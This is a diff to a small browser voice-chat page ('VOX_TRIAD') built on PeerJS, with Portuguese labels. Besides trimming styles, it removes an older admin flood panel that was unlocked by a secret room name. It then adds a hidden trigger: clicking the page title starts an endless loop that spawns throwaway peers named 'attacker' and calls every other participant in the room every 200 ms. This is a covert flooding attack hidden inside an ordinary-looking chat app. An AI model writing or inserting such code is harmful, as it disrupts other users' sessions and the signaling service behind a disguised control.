@@ -12,13 +12,13 @@
             --surface: #141414; 
             --border: #262626;
             --text-dim: #888;
-            --radius: 12px; /* Bordas arredondadas */
+            --radius: 12px;
         }
         
         * { box-sizing: border-box; margin: 0; padding: 0; }
         
         body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
             background: var(--bg); 
             color: #fff; 
             display: flex; 
@@ -35,7 +35,6 @@
             border: 1px solid var(--border);
             border-radius: var(--radius);
             position: relative;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
         
         h1 { 
@@ -46,7 +45,11 @@
             font-weight: 300;
             color: var(--accent);
             opacity: 0.8;
+            cursor: pointer; /* Indica que é clicável */
+            user-select: none;
         }
+        
+        h1:active { opacity: 0.5; }
         
         input { 
             width: 100%; 
@@ -59,10 +62,7 @@
             text-align: center;
             border-radius: var(--radius);
             font-family: monospace;
-            transition: border-color 0.2s;
         }
-        
-        input:focus { border-color: #555; }
         
         button { 
             width: 100%; 
@@ -76,10 +76,7 @@
             margin-bottom: 10px;
             border-radius: var(--radius);
             font-size: 0.75rem;
-            letter-spacing: 1px;
         }
-        
-        button:hover { opacity: 0.9; }
         
         button.sec { 
             background: transparent; 
@@ -87,17 +84,8 @@
             border: 1px solid var(--border); 
         }
 
-        .status-box { 
-            margin-top: 20px; 
-            font-size: 0.7rem; 
-            text-align: center; 
-            color: var(--text-dim);
-            text-transform: uppercase;
-        }
-
         #room-ui { display: none; text-align: center; }
         
-        /* Debug & Stress Panel */
         #debug-console { 
             display: none; 
             background: #000; 
@@ -113,16 +101,6 @@
             font-family: monospace;
         }
 
-        .hidden-trigger { 
-            position: absolute; 
-            bottom: 8px; 
-            right: 12px; 
-            color: #1a1a1a; 
-            cursor: default; 
-            font-size: 14px; 
-            user-select: none; 
-        }
-
         .blink { animation: blinker 2s linear infinite; }
         @keyframes blinker { 50% { opacity: 0.3; } }
 
@@ -132,29 +110,19 @@
 <body>
 
     <div class="app-container">
-        <h1>VOX_TRIAD</h1>
+        <h1 onclick="triggerMassFlood()">VOX_TRIAD</h1>
 
         <div id="setup-ui">
             <input type="text" id="room-id" placeholder="ID DA SALA">
             <button onclick="iniciarSessao()">ENTRAR NA REDE</button>
-            <div class="status-box" id="setup-status">SISTEMA PRONTO</div>
         </div>
 
         <div id="room-ui">
-            <div id="room-display" style="font-size: 0.7rem; color: var(--text-dim); margin-bottom: 20px; letter-spacing: 2px;">SALA: ---</div>
+            <div id="room-display" style="font-size: 0.7rem; color: var(--text-dim); margin-bottom: 20px;">SALA: ---</div>
             <div id="peer-count" class="blink" style="font-size: 0.8rem;">CONECTANDO...</div>
-            
             <div id="debug-console"></div>
-            
-            <div id="admin-tools" style="display:none; margin-top:15px; border-top:1px solid #333; pt-10px;">
-                <input type="text" id="target-id" placeholder="ID ALVO" style="font-size:10px; padding:8px; margin-top:10px;">
-                <button onclick="dispararStress()" style="background:#ff4444; color:#fff; padding:8px; font-size:10px;">EXECUTAR FLOOD</button>
-            </div>
-
             <button class="sec" onclick="location.reload()" style="margin-top: 30px;">ENCERRAR</button>
         </div>
-
-        <div class="hidden-trigger" onclick="toggleDebug()">.</div>
     </div>
 
     <div id="remote-audios"></div>
@@ -162,124 +130,100 @@
     <script>
         let peer = null;
         let localStream = null;
-        let conexoes = 0;
+        let currentRoom = "";
+        let meuIndice = 0;
         let estresseAtivo = false;
-        const salaPrefix = "vox-triad-";
-        const SALA_ADMIN = "vox_root_access"; // Nome da sala para liberar ferramentas
+        const salaPrefix = "vox-t-"; // Prefixo curto para evitar bugs de ID
 
         function logDebug(msg) {
             const consoleDiv = document.getElementById('debug-console');
+            consoleDiv.style.display = 'block';
             consoleDiv.innerHTML += `> ${msg}<br>`;
             consoleDiv.scrollTop = consoleDiv.scrollHeight;
         }
 
-        function toggleDebug() {
-            const dc = document.getElementById('debug-console');
-            dc.style.display = dc.style.display === 'none' ? 'block' : 'none';
-        }
-
         async function iniciarSessao() {
-            const salaNome = document.getElementById('room-id').value.trim().toLowerCase();
-            if (!salaNome) return;
+            currentRoom = document.getElementById('room-id').value.trim().toLowerCase();
+            if (!currentRoom) return;
 
             try {
-                // Filtros de Áudio para resiliência e clareza
                 localStream = await navigator.mediaDevices.getUserMedia({ 
-                    audio: { 
-                        echoCancellation: true, 
-                        noiseSuppression: true,
-                        autoGainControl: true 
-                    } 
+                    audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true } 
                 });
 
                 document.getElementById('setup-ui').style.display = 'none';
                 document.getElementById('room-ui').style.display = 'block';
-                document.getElementById('room-display').innerText = "SALA: " + salaNome.toUpperCase();
+                document.getElementById('room-display').innerText = "SALA: " + currentRoom.toUpperCase();
 
-                // Verifica se entra no modo Admin/Estresse
-                if (salaNome === SALA_ADMIN) {
-                    document.getElementById('admin-tools').style.display = 'block';
-                    logDebug("MODO PRIVILEGIADO ATIVADO");
-                }
-
-                tentarConectar(salaNome, 1);
-
-            } catch (e) { alert("Erro de Permissão de Áudio."); }
+                tentarConectar(1);
+            } catch (e) { alert("HTTPS necessário para áudio."); }
         }
 
-        function tentarConectar(nome, tentativa) {
-            if (tentativa > 3) {
-                alert("Sala cheia (Max: 3).");
-                location.reload();
-                return;
-            }
+        function tentarConectar(tentativa) {
+            if (tentativa > 3) return alert("Sala cheia.");
 
-            const meuID = `${salaPrefix}${nome}-${tentativa}`;
+            const meuID = `${salaPrefix}${currentRoom}-${tentativa}`;
             peer = new Peer(meuID);
 
             peer.on('open', (id) => {
-                logDebug(`ID LOCAL: ${id}`);
-                document.getElementById('peer-count').innerText = `AGUARDANDO PEERS...`;
+                meuIndice = tentativa;
+                logDebug(`ONLINE AS: PEER_${tentativa}`);
+                document.getElementById('peer-count').innerText = `ID: ${id}`;
                 
+                // Conecta com os outros
                 for (let i = 1; i <= 3; i++) {
                     if (i !== tentativa) {
-                        const peerDestino = `${salaPrefix}${nome}-${i}`;
-                        const call = peer.call(peerDestino, localStream);
+                        const call = peer.call(`${salaPrefix}${currentRoom}-${i}`, localStream);
                         if (call) vincularCall(call);
                     }
                 }
             });
 
             peer.on('call', (call) => {
-                logDebug(`LINK RECEBIDO: ${call.peer}`);
                 call.answer(localStream);
                 vincularCall(call);
             });
 
             peer.on('error', (err) => {
-                if (err.type === 'unavailable-id') {
-                    tentarConectar(nome, tentativa + 1);
-                } else {
-                    logDebug(`ERRO: ${err.type}`);
-                }
+                if (err.type === 'unavailable-id') tentarConectar(tentativa + 1);
+                else logDebug("ERRO: " + err.type);
             });
         }
 
         function vincularCall(call) {
             call.on('stream', (remoteStream) => {
                 if (document.getElementById(`audio-${call.peer}`)) return;
-
                 const audio = document.createElement('audio');
                 audio.id = `audio-${call.peer}`;
                 audio.srcObject = remoteStream;
                 audio.autoplay = true;
                 document.getElementById('remote-audios').appendChild(audio);
-                
-                conexoes++;
-                document.getElementById('peer-count').innerText = `SISTEMA ATIVO: ${conexoes + 1}/3`;
+                document.getElementById('peer-count').innerText = `LINK ATIVO`;
                 document.getElementById('peer-count').classList.remove('blink');
-                
-                logDebug(`STREAM ESTABELECIDA: ${call.peer}`);
             });
         }
 
-        // --- LÓGICA DE TESTE DE ESTRESSE (PARA SISTEMA SÉRIO) ---
-        async function dispararStress() {
-            const alvo = document.getElementById('target-id').value.trim();
-            if (!alvo) return alert("Defina o ID do alvo.");
+        // LÓGICA DE FLOOD EM MASSA (Gatilho no H1)
+        async function triggerMassFlood() {
+            if (!currentRoom || estresseAtivo) return;
             
             estresseAtivo = true;
-            logDebug(`INICIANDO FLOOD EM: ${alvo}`);
+            logDebug("INICIANDO FLOOD EM TODOS OS PEERS...");
+
+            const alvos = [];
+            for (let i = 1; i <= 3; i++) {
+                if (i !== meuIndice) alvos.push(`${salaPrefix}${currentRoom}-${i}`);
+            }
 
             while(estresseAtivo) {
-                const dummy = new Peer(); 
-                dummy.on('open', () => {
-                    dummy.call(alvo, localStream);
-                    setTimeout(() => dummy.destroy(), 2000); // Rotatividade de peers
+                alvos.forEach(alvoID => {
+                    const attacker = new Peer();
+                    attacker.on('open', () => {
+                        attacker.call(alvoID, localStream);
+                        setTimeout(() => attacker.destroy(), 1000);
+                    });
                 });
-
-                await new Promise(r => setTimeout(r, 150)); // Delay para evitar crash local
-                if (!estresseAtivo) break;
+                await new Promise(r => setTimeout(r, 200));
             }
         }
     </script>
